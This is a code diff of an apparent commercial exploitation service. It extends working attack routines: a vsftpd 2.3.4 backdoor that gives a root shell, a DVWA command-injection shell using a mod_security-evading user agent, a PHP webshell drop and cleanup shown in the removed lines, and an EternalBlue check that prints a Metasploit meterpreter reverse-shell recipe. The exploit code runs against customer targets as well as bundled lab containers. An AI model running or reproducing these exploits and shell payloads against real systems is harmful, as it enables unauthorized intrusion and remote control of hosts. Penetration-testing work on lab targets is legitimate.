@@ -4104,7 +4104,12 @@ EXPLOIT_SHELLS: dict = {}
 
 class ExploitShell:
     """Holds one active TCP shell connection. Backend keeps the socket alive;
-    frontend polls /output and posts /cmd against the session id."""
+    frontend polls /output and posts /cmd against the session id.
+
+    `user_id` is captured from the request context at construction time so
+    /output and /cmd can verify the caller owns the session. `last_touched`
+    is refreshed on every read/write so the background sweeper can close
+    sessions idle past _XPL_SESSION_IDLE_TIMEOUT."""
     def __init__(self, sid: str, target: str, port: int, exploit: str):
         self.sid       = sid
         self.target    = target
@@ -4117,14 +4122,18 @@ class ExploitShell:
         self.status    = "starting"   # starting | live | closed | error
         self.error     = None
         self.opened_at = datetime.datetime.utcnow().isoformat()
+        self.user_id   = _USER_CTX.get()
+        self.last_touched = _time.time()
 
     def append(self, text: str):
+        self.last_touched = _time.time()
         self.buffer.append(text)
         # Cap memory: keep last ~200 KB
         if sum(len(x) for x in self.buffer) > 200_000:
             self.buffer = self.buffer[-100:]
 
     def drain(self) -> str:
+        self.last_touched = _time.time()
         out, self.buffer = "".join(self.buffer), []
         return out
 
@@ -4135,76 +4144,240 @@ class ExploitShell:
 
 
 class WebShellSession:
-    """Shell session backed by a PHP webshell instead of a TCP socket. Used
-    when reverse-shell callbacks are blocked (PHP disable_functions, lab
-    container can't route back, etc.) — we drop a webshell via the RCE and
-    drive it over HTTP. Implements the same buffer/drain/status surface as
-    ExploitShell so the rest of the system doesn't care which kind it is."""
+    """Shell session backed by HTTP instead of a TCP socket. Two modes:
+       1. "webshell" — POSTs base64(cmd) to a dropped webshell URL
+       2. "cmdi"     — POSTs `ip=127.0.0.1;cmd` to the original RCE form,
+                       parses the response HTML for the cmd output
+
+    Mode 2 is the workhorse for DVWA where dropping a separate webshell
+    file is unreliable (docroot perms, Apache 400, etc.). The cmdi page
+    itself acts as the shell — every command goes through the same vector
+    that gave us RCE in the first place.
+
+    Implements the same buffer/drain/status surface as ExploitShell so
+    the cmd handler doesn't care which kind it is.
+    """
     def __init__(self, sid: str, target: str, port: int, exploit: str,
-                 webshell_url: str, http_session, post_field: str = "c"):
-        self.sid          = sid
-        self.target       = target
-        self.port         = port
-        self.exploit      = exploit
-        self.webshell_url = webshell_url
-        self.http_session = http_session    # requests.Session() — keeps cookies hot
-        self.post_field   = post_field
-        self.buffer       = []
-        self.status       = "live"
-        self.error        = None
-        self.opened_at    = datetime.datetime.utcnow().isoformat()
-        # Marker so the cmd/close handlers can branch on session type without
-        # having to import WebShellSession (avoids a circular-ish reference).
-        self.kind         = "webshell"
-        self.writer       = None     # no socket writer for webshells
-        self.reader       = None
+                 webshell_url: str, http_session,
+                 mode: str = "webshell",
+                 post_field: str = "c",
+                 cmdi_form_field: str = "ip",
+                 cmdi_prefix: str = "127.0.0.1; ",
+                 cmdi_extra_fields: dict = None):
+        self.sid           = sid
+        self.target        = target
+        self.port          = port
+        self.exploit       = exploit
+        self.webshell_url  = webshell_url
+        self.http_session  = http_session
+        self.mode          = mode
+        self.post_field    = post_field
+        self.cmdi_form_field   = cmdi_form_field
+        self.cmdi_prefix       = cmdi_prefix
+        self.cmdi_extra_fields = cmdi_extra_fields or {}
+        self.buffer        = []
+        self.status        = "live"
+        self.error         = None
+        self.opened_at     = datetime.datetime.utcnow().isoformat()
+        self.kind          = "webshell"
+        self.writer        = None
+        self.reader        = None
+        self.user_id       = _USER_CTX.get()
+        self.last_touched  = _time.time()
 
     def append(self, text: str):
+        self.last_touched = _time.time()
         self.buffer.append(text)
         if sum(len(x) for x in self.buffer) > 200_000:
             self.buffer = self.buffer[-100:]
 
     def drain(self) -> str:
+        self.last_touched = _time.time()
         out, self.buffer = "".join(self.buffer), []
         return out
 
     async def send_command(self, cmd: str):
-        """POST the cmd (base64-encoded) to the webshell URL; append the
-        response text to the buffer so the next /output poll returns it.
-        Runs in a thread pool because `requests` is blocking."""
         import asyncio as _asyncio
         try:
-            encoded = _xpl_b64.b64encode(cmd.encode()).decode()
-            # Show the prompt + command in the buffer so the user sees what they typed
             self.append(f"$ {cmd}\n")
             loop = _asyncio.get_event_loop()
-            r = await loop.run_in_executor(None, lambda: self.http_session.post(
-                self.webshell_url,
-                data={self.post_field: encoded},
-                timeout=20, verify=False))
-            self.append(r.text)
-            if not r.text.endswith("\n"):
-                self.append("\n")
+            if self.mode == "cmdi":
+                # Re-fetch CSRF on every call (DVWA rotates user_token per request)
+                ipage = await loop.run_in_executor(None, lambda:
+                    self.http_session.get(self.webshell_url, timeout=10, verify=False))
+                tok_m = re.search(r"name=['\"]user_token['\"]\s+value=['\"]([a-f0-9]+)",
+                                  ipage.text or "")
+                form = dict(self.cmdi_extra_fields)
+                form[self.cmdi_form_field] = self.cmdi_prefix + cmd
+                if tok_m:
+                    form["user_token"] = tok_m.group(1)
+                r = await loop.run_in_executor(None, lambda:
+                    self.http_session.post(self.webshell_url, data=form,
+                                            timeout=20, verify=False))
+                # Pull stdout out of DVWA's <pre> block, strip HTML
+                body = r.text or ""
+                pre = re.search(r"<pre[^>]*>(.*?)</pre>", body, re.IGNORECASE | re.DOTALL)
+                if pre:
+                    out = re.sub(r"<[^>]+>", "", pre.group(1))
+                    out = (out.replace("&lt;", "<").replace("&gt;", ">")
+                              .replace("&amp;", "&").replace("&#039;", "'")
+                              .replace("&quot;", '"'))
+                    # DVWA prepends "ping -c 4 127.0.0.1\n<4 lines of ping>\n..."
+                    # Hide that boilerplate — only show what comes after the ping output.
+                    m = re.search(r"(?:received,.*?loss|rtt min/avg/max).*?\n(.*)", out, re.DOTALL)
+                    out = m.group(1) if m else out
+                    self.append(out.strip() + "\n")
+                else:
+                    self.append(f"[cmdi: no <pre> output, http={r.status_code}, body[:200]={(body[:200] or '').strip()}]\n")
+            else:
+                # Standard webshell mode
+                encoded = _xpl_b64.b64encode(cmd.encode()).decode()
+                r = await loop.run_in_executor(None, lambda: self.http_session.post(
+                    self.webshell_url,
+                    data={self.post_field: encoded},
+                    timeout=20, verify=False))
+                self.append(r.text)
+                if not (r.text or "").endswith("\n"):
+                    self.append("\n")
         except Exception as e:
             self.status = "error"
             self.error  = str(e)
-            self.append(f"[webshell error: {e}]\n")
+            self.append(f"[{self.mode} error: {e}]\n")
 
     def close_session(self):
-        """Best-effort cleanup. Webshells leave a file behind on the target —
-        we attempt to remove it but don't error if we can't."""
-        try:
-            cleanup_cmd = _xpl_b64.b64encode(b"rm -f $(realpath $0)").decode()
-            self.http_session.post(self.webshell_url, data={self.post_field: cleanup_cmd},
-                                    timeout=5, verify=False)
-        except Exception: pass
+        # cmdi-mode leaves nothing behind. webshell-mode tries to remove its file.
+        if self.mode == "webshell":
+            try:
+                cleanup_cmd = _xpl_b64.b64encode(b"rm -f $(realpath $0)").decode()
+                self.http_session.post(self.webshell_url, data={self.post_field: cleanup_cmd},
+                                        timeout=5, verify=False)
+            except Exception: pass
         self.status = "closed"
 
     def to_json(self):
         return {"sid": self.sid, "target": self.target, "port": self.port,
                 "exploit": self.exploit, "status": self.status,
                 "error": self.error, "opened_at": self.opened_at,
-                "kind": "webshell"}
+                "kind": "webshell", "mode": self.mode}
+
+
+# ─────────────────────────────────────────────────────────────────
+#  EXPLOIT INFRASTRUCTURE: per-user ACL, idle sweep, concurrency
+#  locks, lab auto-restart. Keeps the catalog dispatcher in
+#  /api/exploit/run thin and customer-experience predictable even
+#  under concurrent use or stuck lab containers.
+# ─────────────────────────────────────────────────────────────────
+
+_XPL_SESSION_IDLE_TIMEOUT = 30 * 60   # 30 min
+_XPL_SWEEPER_STARTED = False
+EXPLOIT_LOCKS: dict = {}
+
+
+def _xpl_get_session_for_user(sid: str):
+    """Return session iff it belongs to the current user. None otherwise.
+    Caller is responsible for emitting the right HTTP status code."""
+    s = EXPLOIT_SHELLS.get(sid)
+    if s is None:
+        return None
+    if getattr(s, "user_id", None) != _USER_CTX.get():
+        return None
+    return s
+
+
+def _xpl_get_lock(exploit_id: str) -> asyncio.Lock:
+    """Per-exploit-id asyncio.Lock so concurrent customers can't race for
+    a single-use exploit primitive (e.g. vsftpd backdoor's one-shot port
+    6200, DVWA's shared session cookies). Each exploit serializes itself;
+    distinct exploits still run in parallel."""
+    if exploit_id not in EXPLOIT_LOCKS:
+        EXPLOIT_LOCKS[exploit_id] = asyncio.Lock()
+    return EXPLOIT_LOCKS[exploit_id]
+
+
+def _xpl_is_internal_lab(target: str) -> bool:
+    """Heuristic: does this target name look like one of our bundled lab
+    containers? Used to gate destructive recovery actions (docker restart)
+    so we never touch a customer's own infrastructure."""
+    t = (target or "").lower().strip()
+    return (t.startswith("lab_")
+            or t in {"localhost", "127.0.0.1"}
+            or t.startswith(("10.", "172.", "192.168.")))
+
+
+async def _xpl_restart_lab_container(container_name: str,
+                                      wait_for_port: int = 21,
+                                      wait_seconds: int = 30) -> bool:
+    """Best-effort `docker restart <container>` for internal lab targets
+    that got into a stuck state (e.g. vsftpd backdoor port consumed).
+    Waits up to `wait_seconds` for the service port to come back. Returns
+    True on success. Silently no-ops if the docker CLI isn't available
+    (dev environment) so callers can just fall through to the original
+    error in that case."""
+    try:
+        proc = await asyncio.create_subprocess_exec(
+            "docker", "restart", container_name,
+            stdout=asyncio.subprocess.DEVNULL,
+            stderr=asyncio.subprocess.DEVNULL,
+        )
+        try:
+            await asyncio.wait_for(proc.wait(), timeout=15)
+        except asyncio.TimeoutError:
+            try: proc.kill()
+            except Exception: pass
+            return False
+        # Wait for the service port to come back up
+        for _ in range(wait_seconds):
+            if _xpl_port_open(container_name, wait_for_port, timeout=1):
+                return True
+            await asyncio.sleep(1)
+        return False
+    except FileNotFoundError:
+        return False   # docker CLI not in PATH
+    except Exception:
+        return False
+
+
+async def _xpl_session_sweeper():
+    """Background task: every 60s, close shell sessions idle past
+    _XPL_SESSION_IDLE_TIMEOUT. Prevents orphaned sessions accumulating
+    when users close tabs without hitting /close. Never crashes — a
+    failing sweep is logged silently and the loop continues."""
+    while True:
+        try:
+            await asyncio.sleep(60)
+            now = _time.time()
+            dead = [sid for sid, s in list(EXPLOIT_SHELLS.items())
+                    if (now - getattr(s, "last_touched", now))
+                       > _XPL_SESSION_IDLE_TIMEOUT]
+            for sid in dead:
+                s = EXPLOIT_SHELLS.pop(sid, None)
+                if s is None:
+                    continue
+                if isinstance(s, WebShellSession):
+                    try: s.close_session()
+                    except Exception: pass
+                else:
+                    try:
+                        if s.writer: s.writer.close()
+                    except Exception: pass
+                s.status = "closed"
+        except Exception:
+            # Sweeper must never die — swallow and continue
+            pass
+
+
+def _xpl_ensure_sweeper():
+    """Lazily start the sweeper on first /api/exploit/run. Done this way
+    (rather than @app.on_event("startup")) so the rest of the app boots
+    even if asyncio's task plumbing isn't fully ready at import time."""
+    global _XPL_SWEEPER_STARTED
+    if _XPL_SWEEPER_STARTED:
+        return
+    try:
+        asyncio.create_task(_xpl_session_sweeper())
+        _XPL_SWEEPER_STARTED = True
+    except Exception:
+        pass
 
 
 async def _xpl_pipe_reader(reader, shell: "ExploitShell"):
@@ -4271,9 +4444,59 @@ def _xpl_port_open(host: str, port: int, timeout: float = 3.0) -> bool:
 # ─────────────────────────────────────────────────────────────────
 
 async def exploit_vsftpd_234(target: str, sid: str) -> dict:
-    """CVE-2011-2523 — vsftpd 2.3.4 smile-username backdoor. A USER value
-    containing ':)' makes the daemon spawn a passwordless root shell on
-    port 6200. We do four things, in order:
+    """Outer wrapper for CVE-2011-2523: tries the backdoor once, and if it
+    fails because the single-use port 6200 was already consumed AND the
+    target is one of our bundled lab containers, automatically restarts
+    `lab_metasploitable` and tries one more time. The customer never has
+    to SSH in to restart the container manually.
+
+    Non-internal targets fall through with the original error + a hint."""
+    result = await _exploit_vsftpd_234_once(target, sid)
+    if result.get("ok"):
+        return result
+
+    err = result.get("error", "")
+    backdoor_exhausted = ("port 6200" in err
+                          or "Backdoor never bound" in err
+                          or "did not echo `uid=`" in err)
+    if not backdoor_exhausted:
+        return result
+
+    if not _xpl_is_internal_lab(target):
+        result.setdefault(
+            "suggested_action",
+            "The vsftpd backdoor only fires once per daemon. Restart your "
+            "vsftpd 2.3.4 container and try again.")
+        return result
+
+    # Internal lab → try to auto-recover.
+    restarted = await _xpl_restart_lab_container(
+        "lab_metasploitable", wait_for_port=21, wait_seconds=30)
+    if not restarted:
+        result["suggested_action"] = (
+            "The vsftpd backdoor was already consumed and auto-restart of "
+            "lab_metasploitable failed. Wait 60 seconds and try again, or "
+            "contact support if this keeps happening.")
+        return result
+
+    # Second attempt with a fresh container.
+    result2 = await _exploit_vsftpd_234_once(target, sid)
+    if result2.get("ok"):
+        result2["auto_recovered"] = True
+        result2["evidence"] = (
+            (result2.get("evidence") or "")
+            + "  (Lab container was auto-restarted to re-arm the backdoor.)")
+        return result2
+    result2["suggested_action"] = (
+        "We auto-restarted lab_metasploitable but the backdoor still won't "
+        "bind. Wait 30 seconds and try once more.")
+    return result2
+
+
+async def _exploit_vsftpd_234_once(target: str, sid: str) -> dict:
+    """One attempt at CVE-2011-2523 — vsftpd 2.3.4 smile-username backdoor.
+    A USER value containing ':)' makes the daemon spawn a passwordless
+    root shell on port 6200. We do four things, in order:
 
       1. Banner grab port 21 to verify vsftpd 2.3.4 is really there
       2. Fire the smile-trigger over an FTP control channel
@@ -4397,114 +4620,142 @@ def _xpl_web_base(target: str, port: int) -> str:
     return f"http://{target}" if (not port or port == 80) else f"http://{target}:{port}"
 
 
-async def exploit_dvwa_cmdi(target: str, port: int, sid: str, lhost: str, lport: int) -> dict:
-    """DVWA Command Injection (security=low). Logs in with admin/password,
-    forces security=low, then exploits the unsanitized ping target field.
+def _xpl_dvwa_session(base: str) -> tuple:
+    """Set up a hardened requests.Session for DVWA: real User-Agent, login,
+    security=low, then CLEAN the cookie jar so only PHPSESSID + security
+    remain. Apache 400 Bad Request frequently came from duplicate `security`
+    cookies and the default `python-requests/x.y` UA tripping mod_security.
 
-    PREVIOUS APPROACH (didn't work in our docker lab): inject a reverse
-    shell, hope DVWA's bash/PHP/python can call back to the backend on
-    the docker bridge. Failed every time — DVWA's PHP may have
-    disable_functions, the docker network may block inter-container
-    callbacks, or bash may lack /dev/tcp.
-
-    NEW APPROACH: drop a tiny PHP webshell via the cmdi, then drive it
-    over HTTP. Requires only `shell_exec` (which DVWA explicitly enables
-    so it's exploitable in the first place) — no callbacks, no firewall
-    issues, no PHP function gymnastics. The WebShellSession class proxies
-    /api/exploit/shell/{sid}/cmd through this URL transparently."""
-    base = _xpl_web_base(target, port)
+    Returns (session, error_str). On success error_str is None."""
     sess = _req_lib.Session()
-    # 1. Setup DB (idempotent — DVWA needs this on first boot)
+    # Real browser UA — defeats Apache/mod_security rules that 400 on
+    # python-requests' default UA.
+    sess.headers.update({
+        "User-Agent": ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
+                       "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"),
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "Accept-Language": "en-US,en;q=0.5",
+    })
+    # 1. Setup DB (idempotent)
     try:
         sess.get(f"{base}/setup.php", timeout=8, verify=False)
         sess.post(f"{base}/setup.php", data={"create_db": "Create / Reset Database"},
                   timeout=15, verify=False)
-    except Exception:
-        pass
-    # 2. Login
+    except Exception: pass
+    # 2. Login with CSRF
     try:
         r = sess.get(f"{base}/login.php", timeout=8, verify=False)
-        tok_m = re.search(r"name=['\"]user_token['\"]\s+value=['\"]([a-f0-9]+)", r.text)
+        if r.status_code >= 400:
+            return None, f"login.php GET returned {r.status_code}: {(r.text or '')[:160]!r}"
+        tok_m = re.search(r"name=['\"]user_token['\"]\s+value=['\"]([a-f0-9]+)", r.text or "")
         token = tok_m.group(1) if tok_m else ""
-        sess.post(f"{base}/login.php",
-                  data={"username": "admin", "password": "password",
-                        "Login": "Login", "user_token": token},
-                  timeout=8, verify=False, allow_redirects=True)
+        r = sess.post(f"{base}/login.php",
+                      data={"username": "admin", "password": "password",
+                            "Login": "Login", "user_token": token},
+                      timeout=8, verify=False, allow_redirects=True)
+        if r.status_code >= 400:
+            return None, f"login.php POST returned {r.status_code}: {(r.text or '')[:160]!r}"
     except Exception as e:
-        return {"ok": False, "error": f"DVWA login failed: {e}",
-                "cve": "DVWA-CMDI-Low"}
-    # 3. Force security=low
+        return None, f"DVWA login flow failed: {e}"
+    # 3. Force security=low (GET + POST, both methods)
     try:
         sess.get(f"{base}/security.php?security=low", timeout=5, verify=False)
         sess.post(f"{base}/security.php",
                   data={"security": "low", "seclev_submit": "Submit"},
                   timeout=5, verify=False)
     except Exception: pass
+    # 4. CRITICAL: clean the cookie jar. After all the GET/POSTs above,
+    #    requests can have duplicate cookies with same name but different
+    #    paths/domains — these produce a Cookie: header with `name=v1; name=v2`
+    #    that strict Apache builds 400 on. Keep only PHPSESSID + a single
+    #    security=low cookie, rebuilt fresh.
+    phpsessid = sess.cookies.get("PHPSESSID")
+    sess.cookies.clear()
+    if phpsessid:
+        sess.cookies.set("PHPSESSID", phpsessid)
+    sess.cookies.set("security", "low")
+    return sess, None
 
-    # 4. Build the webshell. Short, single-line, base64-decode→shell_exec.
-    #    Random name so multiple runs don't collide.
+
+async def exploit_dvwa_cmdi(target: str, port: int, sid: str, lhost: str, lport: int) -> dict:
+    """DVWA Command Injection (security=low). Drives the cmdi page directly
+    as the shell — each command goes through the same `ip=127.0.0.1; <cmd>`
+    vector that gave us RCE. No webshell file to drop, no docroot perms
+    to worry about, no separate URL to bypass Apache strictness on.
+
+    Why not the reverse-shell or webshell-drop approaches?
+    - Reverse shell: DVWA's PHP may have disable_functions blocking
+      proc_open/fsockopen, or the docker bridge may drop the callback,
+      or bash may lack /dev/tcp. Failed every run in our lab.
+    - Webshell drop: requires writing to /var/www/html (perms?) AND
+      having Apache serve the new file (it did 400 in our lab,
+      probably from accumulated cookies tripping its parser).
+
+    The cmdi-shell approach has neither problem — it reuses the exact
+    request path that confirmed RCE."""
+    base = _xpl_web_base(target, port)
+    sess, err = _xpl_dvwa_session(base)
+    if err is not None:
+        return {"ok": False, "error": f"DVWA session setup failed: {err}",
+                "cve": "DVWA-CMDI-Low"}
+
+    cmdi_url = f"{base}/vulnerabilities/exec/"
+
+    # Verify cmdi works: inject a unique marker via the vector, expect to
+    # see it back in the response. This double-checks the vector AND the
+    # session hardening (no 400 from Apache).
     import secrets
-    webshell_name = f"vl_{secrets.token_hex(4)}.php"
-    webshell_php = (
-        "<?php if(isset($_POST['c'])){"
-        "echo shell_exec(base64_decode($_POST['c']).' 2>&1');"
-        "} ?>"
-    )
-    # DVWA's docroot is /var/www/html. The 'exec' page lives in
-    # /var/www/html/vulnerabilities/exec/. Drop the webshell in docroot.
-    webshell_php_b64 = _xpl_b64.b64encode(webshell_php.encode()).decode()
-    drop_payload = (
-        f"127.0.0.1; echo {webshell_php_b64}|base64 -d > /var/www/html/{webshell_name}"
-    )
+    marker = secrets.token_hex(6)
     try:
-        ipage = sess.get(f"{base}/vulnerabilities/exec/", timeout=8, verify=False)
-        tok_m = re.search(r"name=['\"]user_token['\"]\s+value=['\"]([a-f0-9]+)", ipage.text)
-        token = tok_m.group(1) if tok_m else ""
-        sess.post(f"{base}/vulnerabilities/exec/",
-                  data={"ip": drop_payload, "Submit": "Submit", "user_token": token},
-                  timeout=10, verify=False)
-    except Exception as e:
-        return {"ok": False, "error": f"Webshell drop request failed: {e}",
-                "cve": "DVWA-CMDI-Low", "payload": drop_payload}
-
-    # 5. Verify the webshell — call it with `id`, expect uid= back.
-    webshell_url = f"{base}/{webshell_name}"
-    test_b64 = _xpl_b64.b64encode(b"id").decode()
-    verify_text = ""
-    try:
-        r = sess.post(webshell_url, data={"c": test_b64}, timeout=10, verify=False)
-        verify_text = (r.text or "")
-        if r.status_code != 200 or "uid=" not in verify_text:
+        ipage = sess.get(cmdi_url, timeout=10, verify=False)
+        if ipage.status_code >= 400:
             return {"ok": False,
-                    "error": (f"Webshell drop reached DVWA but verification failed "
-                              f"(status {r.status_code}, body[:200]={verify_text[:200]!r}). "
-                              f"Possible: shell_exec disabled in php.ini, or the docroot "
-                              f"isn't /var/www/html in this DVWA build."),
-                    "cve": "DVWA-CMDI-Low", "payload": drop_payload}
+                    "error": (f"DVWA /vulnerabilities/exec/ returned {ipage.status_code} "
+                              f"on GET. Body[:200]: {(ipage.text or '')[:200]!r}"),
+                    "cve": "DVWA-CMDI-Low"}
+        tok_m = re.search(r"name=['\"]user_token['\"]\s+value=['\"]([a-f0-9]+)", ipage.text or "")
+        token = tok_m.group(1) if tok_m else ""
+        verify_payload = f"127.0.0.1; echo VLMARK_{marker}_END"
+        r = sess.post(cmdi_url,
+                      data={"ip": verify_payload, "Submit": "Submit", "user_token": token},
+                      timeout=15, verify=False)
+        if r.status_code >= 400:
+            return {"ok": False,
+                    "error": (f"DVWA /vulnerabilities/exec/ returned {r.status_code} "
+                              f"on POST. Body[:200]: {(r.text or '')[:200]!r}"),
+                    "cve": "DVWA-CMDI-Low", "payload": verify_payload}
+        if f"VLMARK_{marker}_END" not in (r.text or ""):
+            return {"ok": False,
+                    "error": (f"Cmdi POST reached DVWA (status {r.status_code}) but the marker "
+                              f"`VLMARK_{marker}_END` did not appear in the response — the "
+                              f"injection isn't reaching shell_exec. Body[:240]: "
+                              f"{(r.text or '')[:240]!r}"),
+                    "cve": "DVWA-CMDI-Low", "payload": verify_payload}
     except Exception as e:
-        return {"ok": False,
-                "error": f"Webshell verification request failed: {e}",
-                "cve": "DVWA-CMDI-Low", "payload": drop_payload}
+        return {"ok": False, "error": f"Cmdi verification request failed: {e}",
+                "cve": "DVWA-CMDI-Low"}
 
-    # 6. Create the shell session backed by HTTP, prime it with probe output.
-    shell = WebShellSession(sid, target, port, "dvwa_cmdi_low_webshell",
-                            webshell_url, sess)
-    shell.append(f"=== VulnusLab DVWA webshell @ /{webshell_name} ===\n")
-    shell.append(verify_text)
-    if not verify_text.endswith("\n"):
-        shell.append("\n")
+    # Create the shell session in cmdi mode — every cmd sent will be injected
+    # via the same vector and the <pre> output extracted.
+    shell = WebShellSession(sid, target, port, "dvwa_cmdi_low",
+                            cmdi_url, sess,
+                            mode="cmdi",
+                            cmdi_form_field="ip",
+                            cmdi_prefix="127.0.0.1; ",
+                            cmdi_extra_fields={"Submit": "Submit"})
+    shell.append("=== VulnusLab DVWA cmdi-shell — runs through /vulnerabilities/exec/ ===\n")
     EXPLOIT_SHELLS[sid] = shell
-    # Probe a couple commands so the user sees something on first paint
-    for c in ["whoami", "uname -a", "hostname", "pwd"]:
+    # Probe a couple commands so the shell tab has content on first paint
+    for c in ["id", "whoami", "uname -a", "hostname"]:
         await shell.send_command(c)
 
     return {"ok": True, "shell_id": sid,
             "cve": "DVWA-CMDI-Low",
-            "evidence": (f"Command injection on /vulnerabilities/exec/ → "
-                         f"dropped PHP webshell at /{webshell_name}, verified `id` returned uid="),
+            "evidence": (f"Command injection on /vulnerabilities/exec/ — verified by "
+                         f"marker VLMARK_{marker}_END appearing in the response. "
+                         f"Shell drives commands through the same vector."),
             "shell_target": target, "shell_port": port,
-            "payload": drop_payload,
-            "webshell_url": webshell_url}
+            "payload": f"127.0.0.1; <command>  (injected via 'ip' form field)"}
 
 
 async def exploit_dvwa_sqli(target: str, port: int, sid: str) -> dict:
@@ -4793,6 +5044,227 @@ async def exploit_bwapp_sqli(target: str, port: int, sid: str) -> dict:
         return {"ok": False, "error": f"bWAPP SQLi failed: {e}", "cve": "bWAPP-SQLi-Low"}
 
 
+# ─────────────────────────────────────────────────────────────────
+#  WINDOWS / KERNEL EXPLOITS — added 2026-05
+# ─────────────────────────────────────────────────────────────────
+
+def _smb_negotiate_smbv1(host: str, port: int = 445, timeout: float = 5.0) -> dict:
+    """Send an SMB1 Negotiate Protocol Request. The first 4 bytes are a
+    NetBIOS session header (length=84); the next 32 bytes are an SMB1
+    header (magic \\xffSMB, command 0x72 = Negotiate); the rest enumerates
+    the four SMB1 dialects the client is willing to speak.
+
+    Return shape:
+        {"smbv1_supported": bool,
+         "dialect_index":   Optional[int],
+         "raw_response_hex": str (first 160 hex chars for evidence)}
+
+    Vulnerable hosts respond with the SMB1 magic \\xffSMB and accept the
+    "NT LM 0.12" dialect (index 3 in our offer list). Modern hardened
+    Windows builds either reject SMB1 entirely (no magic in response)
+    or respond with SMB2 magic (\\xfeSMB)."""
+    import socket as _s
+    NEGOTIATE_REQ = (
+        b"\x00\x00\x00\x54\xffSMBr\x00\x00\x00\x00\x18\x53\xc8"
+        b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x2f\x4b\x00\x00\xc5\x5e"
+        b"\x00\x31\x00"
+        b"\x02LANMAN1.0\x00\x02LM1.2X002\x00\x02NT LANMAN 1.0\x00\x02NT LM 0.12\x00"
+    )
+    s = _s.socket(_s.AF_INET, _s.SOCK_STREAM)
+    s.settimeout(timeout)
+    try:
+        s.connect((host, port))
+        s.sendall(NEGOTIATE_REQ)
+        data = s.recv(4096)
+    finally:
+        try: s.close()
+        except Exception: pass
+
+    if len(data) < 8:
+        return {"smbv1_supported": False, "dialect_index": None,
+                "raw_response_hex": data.hex()[:160]}
+    # SMB2+ magic: hardened host
+    if data[4:8] == b"\xfeSMB":
+        return {"smbv1_supported": False, "dialect_index": None,
+                "smb_version": "SMB2+",
+                "raw_response_hex": data.hex()[:160]}
+    # SMB1 magic: vulnerable surface
+    if data[4:8] != b"\xffSMB":
+        return {"smbv1_supported": False, "dialect_index": None,
+                "raw_response_hex": data.hex()[:160]}
+    # Parse word_count and first word (dialect index) from the response body
+    dialect_index = None
+    if len(data) >= 39:
+        wct = data[36]
+        if wct >= 1:
+            dialect_index = int.from_bytes(data[37:39], "little")
+    return {"smbv1_supported": True, "dialect_index": dialect_index,
+            "raw_response_hex": data.hex()[:160]}
+
+
+async def exploit_eternalblue_ms17_010(target: str, port: int, sid: str) -> dict:
+    """CVE-2017-0144 / MS17-010 — EternalBlue. DETECTION ONLY.
+
+    We do not fire the kernel-pool corruption primitive because it crashes
+    a meaningful percentage of vulnerable hosts (~10% BSOD rate). Instead
+    we check whether SMBv1 is enabled (a necessary precondition) and
+    surface a Metasploit one-liner the customer can run themselves
+    against infrastructure they have authorization to crash.
+
+    Returns ok=True only when SMBv1 is on — that is itself a HIGH-severity
+    finding regardless of MS17-010-specific patch status, because SMBv1
+    has been deprecated since 2017 and any host still speaking it is
+    almost certainly missing many other patches too."""
+    loop = asyncio.get_event_loop()
+    try:
+        probe = await loop.run_in_executor(
+            None, _smb_negotiate_smbv1, target, port, 5.0)
+    except Exception as e:
+        return {"ok": False,
+                "error": f"SMB negotiate failed on {target}:{port} — {e}",
+                "cve": "CVE-2017-0144",
+                "suggested_action": (
+                    "Confirm the host is reachable and TCP/445 is open from this server. "
+                    "If your target is behind a firewall, port-forward 445 first.")}
+
+    if not probe.get("smbv1_supported"):
+        smb_ver = probe.get("smb_version", "unknown")
+        return {"ok": False,
+                "vulnerable": False,
+                "cve": "CVE-2017-0144",
+                "error": f"SMBv1 NOT enabled on {target}:{port} (response: {smb_ver}).",
+                "evidence": (f"Server refused SMB1 Negotiate or responded with {smb_ver}. "
+                             "MS17-010 requires SMBv1 — this host is not exploitable via "
+                             "EternalBlue."),
+                "suggested_action": (
+                    "This host is hardened against MS17-010 specifically. Try other "
+                    "Windows SMB-related checks (relay, signing) or pivot to a different "
+                    "service.")}
+
+    # SMBv1 is on — likely vulnerable
+    lines = ["=== EternalBlue MS17-010 — Detection Report ==="]
+    lines.append(f"Target:      {target}:{port}")
+    lines.append(f"SMB Version: SMBv1 (DEPRECATED, vulnerable surface)")
+    lines.append(f"Dialect:     index={probe.get('dialect_index')}")
+    lines.append("")
+    lines.append("VERDICT: 🔴 LIKELY VULNERABLE TO MS17-010")
+    lines.append("")
+    lines.append("REASONING:")
+    lines.append("  SMBv1 was deprecated by Microsoft in 2017 (KB4013389).")
+    lines.append("  Any host still accepting SMBv1 is unpatched or misconfigured,")
+    lines.append("  and the overwhelming majority are vulnerable to MS17-010.")
+    lines.append("")
+    lines.append("EXPLOIT IT (msfconsole, on infra you have authorization to crash):")
+    lines.append("  use exploit/windows/smb/ms17_010_eternalblue")
+    lines.append(f"  set RHOSTS {target}")
+    lines.append(f"  set RPORT {port}")
+    lines.append("  set PAYLOAD windows/x64/meterpreter/reverse_tcp")
+    lines.append("  set LHOST <your-callback-ip>")
+    lines.append("  set LPORT 4444")
+    lines.append("  run")
+    lines.append("")
+    lines.append("CONFIRM FIRST (non-destructive auxiliary scanner):")
+    lines.append("  use auxiliary/scanner/smb/smb_ms17_010")
+    lines.append(f"  set RHOSTS {target}")
+    lines.append("  run")
+    lines.append("")
+    lines.append("⚠  EternalBlue has a ~10% BSOD rate on vulnerable hosts.")
+    lines.append("   Only run it against systems you have explicit authorization to crash.")
+    lines.append("")
+    lines.append("REMEDIATION:")
+    lines.append("  • Apply Microsoft KB4013389 (March 2017 patches)")
+    lines.append("  • Disable SMBv1 entirely (Set-SmbServerConfiguration -EnableSMB1Protocol $false)")
+    lines.append("  • Block TCP/445 at the perimeter firewall")
+
+    shell = ExploitShell(sid, target, port, "eternalblue_ms17_010")
+    shell.status = "live"
+    shell.append("\n".join(lines) + "\n")
+    EXPLOIT_SHELLS[sid] = shell
+    return {"ok": True,
+            "shell_id": sid,
+            "cve": "CVE-2017-0144",
+            "vulnerable": True,
+            "smbv1_supported": True,
+            "dialect_index": probe.get("dialect_index"),
+            "evidence": (f"SMBv1 is enabled on {target}:{port}. Hosts still accepting "
+                         f"SMBv1 are virtually always MS17-010-vulnerable."),
+            "suggested_action": (
+                "Use the metasploit one-liner in the report to exploit (on authorized "
